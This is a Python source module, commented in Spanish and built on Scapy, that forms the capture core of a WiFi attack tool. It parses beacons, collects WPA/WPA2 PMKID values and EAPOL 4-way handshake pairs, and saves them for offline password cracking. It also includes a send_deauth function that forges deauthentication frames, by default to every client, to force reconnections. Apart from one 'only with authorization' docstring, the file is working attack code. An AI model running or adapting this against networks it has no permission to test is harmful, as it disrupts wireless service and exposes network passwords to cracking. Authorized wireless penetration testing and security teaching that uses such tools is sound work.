"""
Núcleo de captura: gestiona el estado de redes, sesiones EAPOL y handshakes.
"""

import time
from typing import Dict

from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Deauth, Dot11Elt, RadioTap
from scapy.layers.eap import EAPOL
from scapy.all import sendp

from .display import TerminalDisplay
from .models import HandshakeData, NetworkInfo
from .parser import PacketParser
from .saver import HandshakeSaver


class HandshakeCapture:
    """
    Escucha paquetes 802.11, extrae redes y handshakes WPA/WPA2
    (PMKID y 4-way EAPOL), y los persiste vía HandshakeSaver.
    """

    def __init__(self, saver: HandshakeSaver, display: TerminalDisplay) -> None:
        self.saver   = saver
        self.display = display

        self.networks: Dict[str, NetworkInfo]   = {}
        self.handshakes: Dict[str, HandshakeData] = {}
        # (bssid, client_mac) → {msg_num: parsed_frame}
        self.eapol_sessions: dict = {}

        self._last_render = 0.0

    # ------------------------------------------------------------------ #
    #  Beacon frames                                                       #
    # ------------------------------------------------------------------ #

    def handle_beacon(self, pkt) -> None:
        bssid = pkt[Dot11].addr2
        if not bssid or bssid in self.networks:
            return

        try:
            ssid = pkt[Dot11Elt].info.decode("utf-8", errors="replace").strip()  # type: ignore[attr-defined]
        except Exception:
            ssid = ""

        try:
            sig = pkt.dBm_AntSignal
        except Exception:
            sig = "N/A"

        self.networks[bssid] = NetworkInfo(
            ssid=ssid or "<oculta>",
            channel=PacketParser.get_channel(pkt),
            signal=sig,
            encryption=PacketParser.get_encryption(pkt),
        )

    # ------------------------------------------------------------------ #
    #  EAPOL Key frames                                                    #
    # ------------------------------------------------------------------ #

    def handle_eapol(self, pkt) -> None:
        dot11       = pkt.getlayer(Dot11)
        eapol_layer = pkt.getlayer(EAPOL)
        if not dot11 or not eapol_layer:
            return

        parsed = PacketParser.parse_eapol_key(bytes(eapol_layer))
        if not parsed:
            return

        msg_num   = parsed["msg_num"]
        src       = dot11.addr2
        dst       = dot11.addr1
        bssid_hdr = dot11.addr3

        # El AP transmite msg1/msg3; el cliente transmite msg2/msg4
        if msg_num in (1, 3):
            ap_mac, client_mac = src, dst
        else:
            client_mac, ap_mac = src, dst

        # addr3 es el BSSID más fiable en redes de infraestructura
        if bssid_hdr and bssid_hdr not in ("ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00"):
            ap_mac = bssid_hdr

        if not ap_mac or not client_mac:
            return

        session_key = (ap_mac, client_mac)
        if session_key not in self.eapol_sessions:
            self.eapol_sessions[session_key] = {}
            ssid_label = self._ssid(ap_mac)
            self.display.log_event(
                f"\033[36m→ EAPOL msg{msg_num}\033[0m  {ssid_label[:28]:<28}  "
                f"{ap_mac}  (cliente: {client_mac})"
            )
        self.eapol_sessions[session_key][msg_num] = parsed

        if ap_mac not in self.handshakes:
            self.handshakes[ap_mac] = HandshakeData(client=client_mac)
        hs = self.handshakes[ap_mac]
        hs.client = client_mac
        hs.frames.append(pkt)

        ssid_label = self._ssid(ap_mac)

        # ---- PMKID (msg1 Key Data) ----
        if msg_num == 1 and hs.pmkid is None:
            pmkid = PacketParser.extract_pmkid(parsed["key_data"])
            if pmkid:
                hs.pmkid = pmkid
                hs.saved = False
                self.display.log_event(
                    f"\033[33m⚡ PMKID detectado\033[0m  {ssid_label[:28]:<28}  "
                    f"{ap_mac}  (cliente: {client_mac})"
                )

        session = self.eapol_sessions[session_key]

        # ---- Handshake completo: M1 + M2 ----
        if 1 in session and 2 in session and hs.anonce is None:
            hs.anonce   = session[1]["nonce"]
            hs.eapol_m2 = session[2]["raw"]
            hs.mic      = session[2]["mic"]
            hs.msg_pair = 0
            hs.saved    = False
            self.display.log_event(
                f"\033[33m⚡ Handshake M1+M2\033[0m  {ssid_label[:28]:<28}  "
                f"{ap_mac}  (cliente: {client_mac})"
            )

        # ---- Alternativa: M2 + M3 ----
        elif 2 in session and 3 in session and hs.anonce is None:
            hs.anonce   = session[3]["nonce"]
            hs.eapol_m2 = session[2]["raw"]
            hs.mic      = session[2]["mic"]
            hs.msg_pair = 1
            hs.saved    = False
            self.display.log_event(
                f"\033[33m⚡ Handshake M2+M3\033[0m  {ssid_label[:28]:<28}  "
                f"{ap_mac}  (cliente: {client_mac})"
            )

        if not hs.saved and (hs.pmkid is not None or hs.anonce is not None):
            self._persist(ap_mac, hs)

    # ------------------------------------------------------------------ #
    #  Guardado                                                            #
    # ------------------------------------------------------------------ #

    def _persist(self, bssid: str, hs: HandshakeData) -> None:
        ok, path, types = self.saver.save(bssid, hs, self.networks)
        if ok:
            hs.saved      = True
            hs.saved_path = path
            fname         = path.rsplit("/", 1)[-1]
            ssid_label    = self._ssid(bssid)
            self.display.log_event(
                f"\033[32m✔ Guardado\033[0m  {ssid_label[:28]:<28}  "
                f"[{', '.join(types)}]  →  {fname}"
            )

    # ------------------------------------------------------------------ #
    #  Deauth (opcional)                                                   #
    # ------------------------------------------------------------------ #

    def send_deauth(
        self,
        iface: str,
        bssid: str,
        client: str = "ff:ff:ff:ff:ff:ff",
    ) -> None:
        """Envía 5 frames de desautenticación. Solo usar con autorización."""
        pkt = (
            RadioTap()
            / Dot11(addr1=client, addr2=bssid, addr3=bssid)
            / Dot11Deauth(reason=7)
        )
        sendp(pkt, iface=iface, count=5, inter=0.1, verbose=False)

    # ------------------------------------------------------------------ #
    #  Handler principal (llamado por scapy.sniff)                        #
    # ------------------------------------------------------------------ #

    def packet_handler(self, pkt) -> None:
        if pkt.haslayer(Dot11Beacon):
            self.handle_beacon(pkt)
        if pkt.haslayer(EAPOL):
            self.handle_eapol(pkt)

        now = time.monotonic()
        if now - self._last_render >= 0.25:   # máx. 4 fps
            self._last_render = now
            self.display.render(self.networks, self.handshakes, self.eapol_sessions)

    # ------------------------------------------------------------------ #
    #  Utilidades internas                                                 #
    # ------------------------------------------------------------------ #

    def _ssid(self, bssid: str) -> str:
        """Devuelve el SSID conocido para un BSSID o el propio BSSID."""
        return self.networks[bssid].ssid if bssid in self.networks else bssid
